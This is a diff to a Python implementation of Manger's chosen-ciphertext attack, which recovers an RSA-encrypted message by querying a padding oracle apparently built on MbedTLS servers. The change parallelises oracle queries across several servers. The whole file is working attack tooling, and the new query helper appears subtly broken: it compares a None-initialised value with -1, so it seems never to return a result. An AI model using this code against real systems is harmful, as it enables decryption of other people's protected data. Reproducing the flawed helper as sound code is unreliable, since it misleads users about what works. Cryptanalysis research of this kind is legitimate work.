@@ -2,9 +2,9 @@
 Chosen-ciphertext attack on PKCS #1 v1.5
 https://www.iacr.org/archive/crypto2001/21390229.pdf
 """
-from oracles import Oracle_MbedTLS
+from oracles import MbedTLS_Oracle
 from Crypto.Cipher import PKCS1_OAEP
-from attack_args import parse_args, read_pubkey, unpad
+from attack_args import parse_args, read_pubkey
 
 
 def divceil(a, b):
@@ -31,6 +31,21 @@ def divfloor(a, b):
     return q
 
 
+def query(oracle, key, c, k, initial, query_gen, expected_result, num_queries=None):
+    if num_queries is None:
+        num_queries = len(oracle)
+    curr_val = initial
+    for _ in range(num_queries):
+        oracle.add_query(curr_val, ((pow(curr_val, key.e, key.n) * c) % key.n).to_bytes(k, byteorder="big"))
+        curr_val = query_gen(curr_val)
+    retval = None
+    for _ in range(num_queries):
+        value, result = oracle.wait_query()
+        if result == expected_result and retval == -1:
+            retval = value
+    return retval
+
+
 def find_f1(k, key, c, oracle):
     """
     Step 1 of the attack
@@ -41,11 +56,11 @@ def find_f1(k, key, c, oracle):
     :return: f1 such that B/2 <= f1 * m / 2 < B
     """
     f1 = 2
-    while oracle.query(((pow(f1, key.e, key.n) * c) % key.n).to_bytes(k, byteorder='big')):
-        f1 *= 2
-    return f1
-
-
+    while True:
+        res = query(oracle, key, c, k, f1, lambda x: x * 2, False)
+        if res is not None:
+            return res
+        f1 *= 1 << len(oracle)
 
 
 def find_f2(k, key, c, f1, oracle):
@@ -60,8 +75,12 @@ def find_f2(k, key, c, f1, oracle):
     """
     B = 2 ** (8 * (k - 1))
     f2 = divfloor(key.n + B, B) * (f1 // 2)
-    while not oracle.query(((pow(f2, key.e, key.n) * c) % key.n).to_bytes(k, byteorder='big')):
-        f2 += f1 // 2
+
+    while True:
+        res = query(oracle, key, c, k, f2, lambda x: x + f1 // 2, True)
+        if res is not None:
+            return res
+        f2 += (f1 // 2) * len(oracle)
     return f2
 
 
@@ -88,7 +107,7 @@ def find_m(k, key, c, f2, oracle, verbose=False):
         i = divfloor(f_tmp * m_min, key.n)
         f3 = divceil(i * key.n, m_min)
 
-        if oracle.query(((pow(f3, key.e, key.n) * c) % key.n).to_bytes(k, byteorder='big')):
+        if query(oracle, key, c, k, f3, lambda x: x, True, 1):
             m_max = divfloor(i * key.n + B, f3)
         else:
             m_min = divceil(i * key.n + B, f3)
@@ -130,7 +149,7 @@ if __name__ == "__main__":
 
     k = int(args.n_length / 8)
 
-    oracle = Oracle_MbedTLS(port=args.start_port)
+    oracle = MbedTLS_Oracle(port=args.server_port, stage=args.stage, num_servers=args.num_servers)
 
     with open(args.public_key, "rb") as keyfile:
         pub_key = read_pubkey(keyfile, k)
@@ -143,6 +162,3 @@ if __name__ == "__main__":
 
     result = manger_attack(k, pub_key, c, oracle, True)
     print(result)
-    if result is not None:
-        print("Unpadded:")
-        print(unpad(result))
